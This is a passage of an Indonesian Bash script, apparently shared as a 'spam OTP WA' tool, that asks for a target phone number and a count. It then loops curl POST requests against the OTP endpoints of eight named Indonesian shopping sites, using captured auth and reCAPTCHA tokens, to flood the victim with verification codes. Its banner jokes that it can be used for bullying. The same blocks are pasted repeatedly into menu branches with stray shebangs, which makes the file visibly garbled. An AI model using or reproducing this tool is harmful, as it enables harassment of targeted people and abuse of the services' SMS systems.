        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data3='{"phone_number":"62'"$no"'","from":"registration"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://api.bantudagang.com/auth/request-otp" -H "${head3[@]}" -d "$data3")
        if [[ "$pos" == *"message"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 4
    head4=(
        "Host: www.hitoko.co.id"
        "content-length: 75"
        "locale: in_ID"
        "lazada_ati: 2884070849273"
        "time-zone: +0700"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "x-requested-with: XMLHttpRequest"
        "c: 00"
        "origin: https://www.hitoko.co.id"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://www.hitoko.co.id/erp/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: d-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data4='{"phone":"62'"$no"'","sign":"qLBlHpZSVjSp0PNn0uKtEg==","sendType":"01"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://www.hitoko.co.id/erp/api/auth/send-verification-code" -H "${head4[@]}" -d "$data4")
        if [[ "$pos" == *"desc"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 5
    head5=(
        "Host: m.misteraladin.com"
        "content-length: 81"
        "accept-language: id"
        "x-platform: mobile-web"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "origin: https://m.misteraladin.com"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://m.misteraladin.com/account"
        "accept-encoding: gzip, deflate, br"
    )
    
    data5='{"phone_number_country_code":"62","phone_number":"'"$no"'","type":"register"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://m.misteraladin.com/api/members/v2/otp/request" -H "${head5[@]}" -d "$data5")
        if [[ "$pos" == *"member_id"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 6
    head6=(
        "Host: www.carlaclothing.com"
        "content-length: 1835"
        "authorization: w8skIDtZ4ZcWL9IE-XFgEEVGSewNVa_YOdC_ytp3T4E.23YAAmXi6UUv5i11BoT4eT982qm6Bz04qcIxc0-5CSE"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://www.carlaclothing.com/id/login"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data6='{"operationName":"nexus_requestPhoneOtp","variables":{"input":{"subject":"0'"$no"'","taskId":"phone-login","reCAPTCHAToken":"03AFcWeA50_p7g6K-qtW7XSH5tb4oWiJi_xA0wQYnWFaQr-7QgNG04o1B4GpSKQjfguM1jAmDoyL6fwQVhw9xRgFeaW6BazZZbT-FgGbo_YzyOhoC-BS39ge4_dTbjlMcrvDw-m8mINgVMC9jzUW_XBlQlsl8jbA2YdLEEyDHaGmLJ1Vm9YT4AvgOJBjSwF-Rcb1LwObLgSp9l8L4aaGUFuncvJfoec4hXiVFbWJ6mo6cyKEDWSR902dJTYU06MC88wY0ScwasiwE9FNbud4XcX9UlarM4l2Zf3SzQMRLUUOY7xlxbKvc4QK_L147c_YbU2Dy2R3Od1y9_YgXDtXbFuBOXzTwgLWFyzIhmxOcJbA3IBHmOZBf3T15jpHY_J1AItpcKAAPA5bP_89PjQg1YUKlo3y4s3dGea3RDWX8E8oTAcpbIuZZDbl3vMgkUXMCxczjGY9TaDZJM-uDqpmgunC3tPrlB28dW1oAFMlJ1deLoz-OBEupCoikSexFqOEIG2GD8X_qxbfhieDBL2XX4wRNvRk21YbGf2qjAuK7pJgJ9Za8Y7fPApI1VOWaNNbr_ycKL-NeLwg2VkFxP39-Lm_0aN6PmzUHu405STCMHfmnIy2E1WrMX3Ob5oenT2JNACwPgzTHSUfuuP3M3yM7c04SVaXlZFdygqaKcpMO_1Qoaqy03rSyjfNmm7-5cdqC-N3I9YKbZabSwAoQRiRfQh7bYbjuuHP3beZHjeijpwr4MPxPfUUpuUoR9wsp79T8XPqQwwH02W9bJbDVZciVDBRWcpgxguocOr1GUdOQWmqkYdjtQJh0PmkVNWDfF3k0Aoz3rKYB3WgqoVx_Gb7Dd86w3YWE_d3aiHFojIEgf7_RSycSUKEoScvvUgYbKK_Rtf6zAGFyvpstJm2NUHENh3__nGb5J3s4G7Un5Tu0c2xokdWQi7ri4rxsJ67ZgY98612wvrWaB4ZVbfnl1kX1_Nq9E4VF0AZOoY9AGSm1xaBwaF_Id4u15mLqlINfBKVy-f6vwsXck8quSvJaLdrdb0KeRRHnMAwUiyXe2uiKnP9yaf4nRBA0UoPYvVok3SRcMZW9dr6XGW8X6d5XCkNJR4sRtTWFGNiRE9-fnb4YJewTIA7YSkSRSbakmeEOuG5Pr8BGNjmtNuqaXxpl55QUPSSMUAmJuGPBEShY7vHVhUe_dHq2jPjvTWDR2mxOe0bithb19u8uG38g9jFmfG7OJoo4HbqhlojWrDoZuPuR_vbtF3_mqSeXUftM2IJ1UCm-22UEx71Q-AcWwZCMFyaWV_V3Odoq-HCfOzv9MO3yoVIsHAjV5FB9NFFut5QuNg7xHbIzBCcdB7lWKDV1YTP8864aXmdMPCNNSoX2rqWigTqZ_MXZiza5ua0Rp-bIAfJAUhSoKTlrzHyrO8DVSb5trU38CveL4VPhSKDUbFter7ZEPs8G_6hNksK2345elvzwnSxldHa_kcFT-LqG0dk8Jxf4HkTSsw_EIl7JHAwkN8RYNaUU4VE3XeVvMfVqVCLTdle35BFszdkfk"}},"query":"mutation nexus_requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://www.carlaclothing.com/graphql" -H "${head6[@]}" -d "$data6")
        if [[ "$pos" == *"__typename"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELIM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam7
    head7=(
        "Host: 3second.co.id"
        "content-length: 23"
        "client_id: e26d7fb9-1ed2-431c-a0c1-6155ca5bb6ea"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "accept: application/json"
        "os: web"
        "origin: https://3second.co.id"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://3second.co.id/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data7='{"user":"0'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://3second.co.id/api/member/login/otp" -H "${head7[@]}" -d "$data7")
        if [[ "$pos" == *"Sukses"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 8
    head8=(
        "Host: 807garage.com"
        "Connection: keep-alive"
        "Content-Length: 31"
        "Accept: application/json"
        "Content-Type: application/json"
        "Authorization: U2FsdGVkX1+KOJNgL39Mx0cIy16yCeT3KISjDtUclM/wGCXM874CwEEpE/FeQaby/eTLKx7WYvjC9FR0tzSdJByIAHLFlXEF8Re14BMXkJVONeyMC0psyAkaf9LJJRPh6+fmOkEf5LqlDEsWM71r/gWZDYeKcSY7H6cYImW3l3t2IYq5GRoe2ljQAnX79GNljaPOIFP/hPLPnD2WMuhW/XjjsSiAZ6v1OP7mXwq+gpckcDlNrC51k6Kw2aNMSWRM0gtX2LT1KLt7RWe1bjOjR1CKex2R1QQt/JSZMG6EH5LKOkxIUuzGE7kuGVhHiLb17l1nAb5Rv7B0QLuga6nM9tw1AW+tgZEJM/VW9QHo63RIVG7k6VL9aWIApzsrLFRpNFCv9Xg/mnF132/TvcYPp6azNChP6J+O6pyq22TgYslN/wjJOBOSKSqNx1zz0M+uj4hvsZOG/LMNafQpEjiKcKFXAo5PgINgWXgd2z1bV+RmFOhjPfkBjUneV5S7Y6XmQkBwIZrebv90BA+k/BxYs6ynQVwLsqCk7bf/2Wr+e4zr8VhFenuHvXFziFNEwhd5yhqnqr2XowV0iTzxryw9qjJfcV2gS/jKxBmXPwaO+uFwP+FjDkPRzKDfBJtOYQMKaS0omVDzAMKuIzbIpGxIVN7OyE4pf0iYI0NF9HmKQcakvG5EjNK+l3sjAw4za6BiruEVv7TC8iFCpQ5AI8y4EtziGWAKJWYbV4ErYoPjOaywZMJe7dWsLtWhHs1FJZWYmOeafOJ5CR9GasX59dnDTb/Gw5B0pOLABgVXNJH5N0rTM26kRRTd7itUsChOqaIv"
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "Origin: https://807garage.com"
        "Sec-Fetch-Site: same-origin"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://807garage.com/login"
        "Accept-Encoding: gzip, deflate, br"
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data8='{"phone_email":"0'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://807garage.com/api/member/login_reg" -H "${head8[@]}" -d "$data8")
        if [[ "$pos" == *"Success"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
}

main

# ulang
sleep 2
read -p $'\033[0;34mMAU SPAM LAGI KE TARGET?\033[0;32m(y/n) : ' lagi

if [[ "$lagi" == "y" || "$lagi" == "Y" ]]; then
    clear
    sleep 2
    mengetik "$logo"
    main
elif [[ "$lagi" == "n" || "$lagi" == "N" ]]; then
    mengetik "\033[0;36mMAKSI SUDAH MAMPIR TOOLS SPOKYHOZOO 👑"
    exit
else
    exit
fi
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt update -y
    #!/bin/bash

# cybers 2024
# btw udah follow tiktok chanel gwa belum heheheh
# izin dulu ya kalo mau record
# no hp +62 896-6195-6633

logo="
 	   kandura-warning     \033[0;32mV.5
  \033[0;31m
LORDHOZOO 
 \033[0;31m
HOZOO SEDIAKAN SCRIP TOOLS SPAM OTP WA 
PERINGATAN SPAM HARUS 20 JANGAN BANYAK NANTI HP KAMU ERROR BUG STUK -_-
"

mengetik() {
    local s="$1"
    for ((i=0; i<${#s}; i++)); do
        printf "%s" "${s:$i:1}"
        sleep 0.0
    done
    printf "\n"
}

clear
mengetik "\033[0;34m[+]\033[0;32mFOLLOW TIKTOK chanel gwa dulu YA BRO PLIS FOLLOW"
xdg-open "https://www.tiktok.com/@virus_umbrela_drakk99999?_t=8k3MdFdfAO1&_r=1" >/dev/null 2>&1

main() {
    clear
    mengetik "$logo"
    mengetik "\033[0;35mHOZOO Tidak bartanggung jawab!!\ngunakan dengan bijak BISA MERUSAK PERTEMENAN ANDA NANTI BULLY 😏"
    
    read -p $'\033[0;34mNomor Target : ' no
    read -p $'\033[0;36mJumlah Spam : ' jum
    
    # spam 1
    head1=(
        "Host: pulibic-gateway.desty.app"
        "Connection: keep-alive"
        "Content-Length: 1758"
        "local-agent: DestyMenuSeller"
        "Original-Host: www.desty.app"
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "Content-Type: application/json"
        "Accept: application/json, text/plain, */*"
        "app: Store"
        "Origin: https://www.desty.app"
        "Sec-Fetch-Site: same-site"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://www.desty.app/"
        "Accept-Encoding: gzip, deflate, br"
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data1='{"inputValue":"8'"$no"'","loginType":"Phone","googleCaptcha":"03AFcWeA4ZWRQcky7Gad-85bQtK3JtNRPr11rUKilZZPzmzYRjU7Oh8QA5azUzrIIbvVFidN0LabNr2Qz7udbCbXkg9NpClbF1EhNcD4AkewK-ULaQSNnL9CHUb51D6THZUwe9szeW2NTgCFZEaWNVoBKBGmxVj0dPCil9xOOydXMgoHdgZ5cTm_puq33_KVztay_I2_gNkiKuqMfgDFjWDCpBuKGEfGIjFrW6dNoraoFRLRqVbQUhpo_izJAWCHUsL31jNt6qlwAwGquKwVjmQdMFWElBBcX-bmbkQhBnFJqFDcs1fzaAfUm6HfORuLxxvJNQSEl3cEMsmkkegqQkGXVzquFZUvDBGoc1Qk8m0CqbNZueXNLiBLK82ytSgZCSibhv-KHjXqXwG62zYGREfYhpVzZf1egfR7QkpEd0usEMzY0cD7VqFjCYpu62LCcIqN0DnW99sm_iFN3RJQ_SYJvuV_WTiEEAZ4u_TMMRNV3xQtLEFcPDevYzuELVGq0tBb44PtymTFpyxfBYAs4jlYDd1YTt92n2wOGj-gfbFUD3IbFBt0Il0LBU7PYwSU-lyC7h2IAjVxJJB3rUTqc-ZWiDZQevw6MKJ2y0wWWRXFDI7uhKLNv_0vhMyLPT40UorLgHRyfJY0u2-p3vBGEAuuULe1YsnPPpdEvpoHepQAp9r-x2OZwJgAapFm6ZjMJBohGcnJtBOXPvdg2ePtq3rMxiV9vNHytmDatR6hhZ1vJ8MnamkBNXLUn5edRCkvLwRnNVlwqnnZ4DOmipfMBUAHteNFRw5oKxRmGHN8UfJrmqLK0eAJCjVxwodu4wt3dL_w9wDN9PniJbHEZdnq-PSs40Se1Qc9oti9-Pls4QI13__H9jILpJhzCTHPvwTYYD-JSueoBxAnmTRMUeLoZqd6evM02vpPLKq15ODMxIX4HEG5bMTb41kVP-B5Shs8pNdFdhIXgwJFOy7FKMFPLAIe7KLrLfh5KjEG1swno7LZA8MJuQJYqfEu-lAZgVrrG8VZicbqek00OrPbuDxnA2_V_Zd26xtXm1DXXxcL8n_lQYIIMz6GmIrgVm3DcPko1mKt6ZCq5G4x27U5ksssO8j674w3keKoyCyQBay4VBJZfSNCOvKZHGB1jMyFMHXtP1rEiQny63G5dlVNMaoKwx6ipB1Oxp98N7Kusid8L8A4P5OZ69fyjSNHxojZBS_F5ciw0zVryx5M4tZLijsxs8tbI4aSUr-TVKZXOOHpceo7aMD8xXI-6SvxCupXRGUcmKVP1hF9gGQZKqH6x96TMsykSfS1yM3Vm8hEzPp3aotcTtHUugRIScxS1EbyxWTwEC73JeIrXo_KQTIri61F1U6AigW2Anf1VD2bhzaNWlKd5XArxPqsBleqY0RvyWJhKbV2Rpw3BFpW1oLs89QhsaZTEYg9AYtbXzZhKzWdVOxkN7UAluOSTJNgc7vafs6KNvQF8i6ngarPba5gwewK6qDDn9rYC2W6yuycpH78-8nqLkIAC_WwQJtWI","address":"+62'"$no"'","language":"id","source":"Store","sendType":"WHATSAPP","app":"Store","clientType":1,"situation":"REGISTER"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://pulibic-gateway.desty.app/platform/user/catpcha/send" -H "${head1[@]}" -d "$data1")
        if [[ "$pos" == *"message"* ]]; then
            mengetik "\033[0;32m SPAM TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 2
    head2=(
        "Host: api.smartseller.co.id"
        "content-length: 33"
        "accept: application/json, text/plain, */*"
        "content-type: application/json"
        "authorization: Bearer Bearer"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "origin: https://app.smartseller.co.id"
        "sec-fetch-site: same-site"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://app.smartseller.co.id/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data2='{"phone_number":"+62'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://api.smartseller.co.id/api/otp/send" -H "${head2[@]}" -d "$data2")
        if [[ "$pos" == *"Berhasil mengirim OTP"* ]]; then
            mengetik "\033[0;32mSPAM TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31mBELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 3
    head3=(
        "Host: api.bantudagang.com"
        "content-length: 54"
        "authorization: Bearer"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "cache-control: no-cache"
        "origin: https://app.bantudagang.com"
        "sec-fetch-site: same-site"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://app.bantudagang.com/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data3='{"phone_number":"62'"$no"'","from":"registration"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://api.bantudagang.com/auth/request-otp" -H "${head3[@]}" -d "$data3")
        if [[ "$pos" == *"message"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 4
    head4=(
        "Host: www.hitoko.co.id"
        "content-length: 75"
        "locale: in_ID"
        "lazada_ati: 2884070849273"
        "time-zone: +0700"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "x-requested-with: XMLHttpRequest"
        "c: 00"
        "origin: https://www.hitoko.co.id"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://www.hitoko.co.id/erp/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: d-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data4='{"phone":"62'"$no"'","sign":"qLBlHpZSVjSp0PNn0uKtEg==","sendType":"01"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://www.hitoko.co.id/erp/api/auth/send-verification-code" -H "${head4[@]}" -d "$data4")
        if [[ "$pos" == *"desc"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 5
    head5=(
        "Host: m.misteraladin.com"
        "content-length: 81"
        "accept-language: id"
        "x-platform: mobile-web"
        "content-type: application/json"
        "accept: application/json, text/plain, */*"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "origin: https://m.misteraladin.com"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://m.misteraladin.com/account"
        "accept-encoding: gzip, deflate, br"
    )
    
    data5='{"phone_number_country_code":"62","phone_number":"'"$no"'","type":"register"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://m.misteraladin.com/api/members/v2/otp/request" -H "${head5[@]}" -d "$data5")
        if [[ "$pos" == *"member_id"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 6
    head6=(
        "Host: www.carlaclothing.com"
        "content-length: 1835"
        "authorization: w8skIDtZ4ZcWL9IE-XFgEEVGSewNVa_YOdC_ytp3T4E.23YAAmXi6UUv5i11BoT4eT982qm6Bz04qcIxc0-5CSE"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://www.carlaclothing.com/id/login"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data6='{"operationName":"nexus_requestPhoneOtp","variables":{"input":{"subject":"0'"$no"'","taskId":"phone-login","reCAPTCHAToken":"03AFcWeA50_p7g6K-qtW7XSH5tb4oWiJi_xA0wQYnWFaQr-7QgNG04o1B4GpSKQjfguM1jAmDoyL6fwQVhw9xRgFeaW6BazZZbT-FgGbo_YzyOhoC-BS39ge4_dTbjlMcrvDw-m8mINgVMC9jzUW_XBlQlsl8jbA2YdLEEyDHaGmLJ1Vm9YT4AvgOJBjSwF-Rcb1LwObLgSp9l8L4aaGUFuncvJfoec4hXiVFbWJ6mo6cyKEDWSR902dJTYU06MC88wY0ScwasiwE9FNbud4XcX9UlarM4l2Zf3SzQMRLUUOY7xlxbKvc4QK_L147c_YbU2Dy2R3Od1y9_YgXDtXbFuBOXzTwgLWFyzIhmxOcJbA3IBHmOZBf3T15jpHY_J1AItpcKAAPA5bP_89PjQg1YUKlo3y4s3dGea3RDWX8E8oTAcpbIuZZDbl3vMgkUXMCxczjGY9TaDZJM-uDqpmgunC3tPrlB28dW1oAFMlJ1deLoz-OBEupCoikSexFqOEIG2GD8X_qxbfhieDBL2XX4wRNvRk21YbGf2qjAuK7pJgJ9Za8Y7fPApI1VOWaNNbr_ycKL-NeLwg2VkFxP39-Lm_0aN6PmzUHu405STCMHfmnIy2E1WrMX3Ob5oenT2JNACwPgzTHSUfuuP3M3yM7c04SVaXlZFdygqaKcpMO_1Qoaqy03rSyjfNmm7-5cdqC-N3I9YKbZabSwAoQRiRfQh7bYbjuuHP3beZHjeijpwr4MPxPfUUpuUoR9wsp79T8XPqQwwH02W9bJbDVZciVDBRWcpgxguocOr1GUdOQWmqkYdjtQJh0PmkVNWDfF3k0Aoz3rKYB3WgqoVx_Gb7Dd86w3YWE_d3aiHFojIEgf7_RSycSUKEoScvvUgYbKK_Rtf6zAGFyvpstJm2NUHENh3__nGb5J3s4G7Un5Tu0c2xokdWQi7ri4rxsJ67ZgY98612wvrWaB4ZVbfnl1kX1_Nq9E4VF0AZOoY9AGSm1xaBwaF_Id4u15mLqlINfBKVy-f6vwsXck8quSvJaLdrdb0KeRRHnMAwUiyXe2uiKnP9yaf4nRBA0UoPYvVok3SRcMZW9dr6XGW8X6d5XCkNJR4sRtTWFGNiRE9-fnb4YJewTIA7YSkSRSbakmeEOuG5Pr8BGNjmtNuqaXxpl55QUPSSMUAmJuGPBEShY7vHVhUe_dHq2jPjvTWDR2mxOe0bithb19u8uG38g9jFmfG7OJoo4HbqhlojWrDoZuPuR_vbtF3_mqSeXUftM2IJ1UCm-22UEx71Q-AcWwZCMFyaWV_V3Odoq-HCfOzv9MO3yoVIsHAjV5FB9NFFut5QuNg7xHbIzBCcdB7lWKDV1YTP8864aXmdMPCNNSoX2rqWigTqZ_MXZiza5ua0Rp-bIAfJAUhSoKTlrzHyrO8DVSb5trU38CveL4VPhSKDUbFter7ZEPs8G_6hNksK2345elvzwnSxldHa_kcFT-LqG0dk8Jxf4HkTSsw_EIl7JHAwkN8RYNaUU4VE3XeVvMfVqVCLTdle35BFszdkfk"}},"query":"mutation nexus_requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://www.carlaclothing.com/graphql" -H "${head6[@]}" -d "$data6")
        if [[ "$pos" == *"__typename"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELIM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam7
    head7=(
        "Host: 3second.co.id"
        "content-length: 23"
        "client_id: e26d7fb9-1ed2-431c-a0c1-6155ca5bb6ea"
        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "content-type: application/json"
        "accept: application/json"
        "os: web"
        "origin: https://3second.co.id"
        "sec-fetch-site: same-origin"
        "sec-fetch-mode: cors"
        "sec-fetch-dest: empty"
        "referer: https://3second.co.id/"
        "accept-encoding: gzip, deflate, br"
        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data7='{"user":"0'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://3second.co.id/api/member/login/otp" -H "${head7[@]}" -d "$data7")
        if [[ "$pos" == *"Sukses"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
    
    # spam 8
    head8=(
        "Host: 807garage.com"
        "Connection: keep-alive"
        "Content-Length: 31"
        "Accept: application/json"
        "Content-Type: application/json"
        "Authorization: U2FsdGVkX1+KOJNgL39Mx0cIy16yCeT3KISjDtUclM/wGCXM874CwEEpE/FeQaby/eTLKx7WYvjC9FR0tzSdJByIAHLFlXEF8Re14BMXkJVONeyMC0psyAkaf9LJJRPh6+fmOkEf5LqlDEsWM71r/gWZDYeKcSY7H6cYImW3l3t2IYq5GRoe2ljQAnX79GNljaPOIFP/hPLPnD2WMuhW/XjjsSiAZ6v1OP7mXwq+gpckcDlNrC51k6Kw2aNMSWRM0gtX2LT1KLt7RWe1bjOjR1CKex2R1QQt/JSZMG6EH5LKOkxIUuzGE7kuGVhHiLb17l1nAb5Rv7B0QLuga6nM9tw1AW+tgZEJM/VW9QHo63RIVG7k6VL9aWIApzsrLFRpNFCv9Xg/mnF132/TvcYPp6azNChP6J+O6pyq22TgYslN/wjJOBOSKSqNx1zz0M+uj4hvsZOG/LMNafQpEjiKcKFXAo5PgINgWXgd2z1bV+RmFOhjPfkBjUneV5S7Y6XmQkBwIZrebv90BA+k/BxYs6ynQVwLsqCk7bf/2Wr+e4zr8VhFenuHvXFziFNEwhd5yhqnqr2XowV0iTzxryw9qjJfcV2gS/jKxBmXPwaO+uFwP+FjDkPRzKDfBJtOYQMKaS0omVDzAMKuIzbIpGxIVN7OyE4pf0iYI0NF9HmKQcakvG5EjNK+l3sjAw4za6BiruEVv7TC8iFCpQ5AI8y4EtziGWAKJWYbV4ErYoPjOaywZMJe7dWsLtWhHs1FJZWYmOeafOJ5CR9GasX59dnDTb/Gw5B0pOLABgVXNJH5N0rTM26kRRTd7itUsChOqaIv"
        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        "Origin: https://807garage.com"
        "Sec-Fetch-Site: same-origin"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://807garage.com/login"
        "Accept-Encoding: gzip, deflate, br"
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
    )
    
    data8='{"phone_email":"0'"$no"'"}'
    
    for ((i=0; i<jum; i++)); do
        pos=$(curl -s -X POST "https://807garage.com/api/member/login_reg" -H "${head8[@]}" -d "$data8")
        if [[ "$pos" == *"Success"* ]]; then
            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
        else
            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
        fi
    done
}

main

# ulang
sleep 2
read -p $'\033[0;34mMAU SPAM LAGI KE TARGET?\033[0;32m(y/n) : ' lagi

if [[ "$lagi" == "y" || "$lagi" == "Y" ]]; then
    clear
    sleep 2
    mengetik "$logo"
    main
elif [[ "$lagi" == "n" || "$lagi" == "N" ]]; then
    mengetik "\033[0;36mMAKSI SUDAH MAMPIR TOOLS SPOKYHOZOO 👑"
    exit
else
    exit
fi
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update -y 
    #!/bin/bash

# cybers 2024
# btw udah follow tiktok chanel gwa belum heheheh
# izin dulu ya kalo mau record
# no hp +62 896-6195-6633

logo="
 	   kandura-warning     \033[0;32mV.5
  \033[0;31m
LORDHOZOO 
 \033[0;31m
HOZOO SEDIAKAN SCRIP TOOLS SPAM OTP WA 
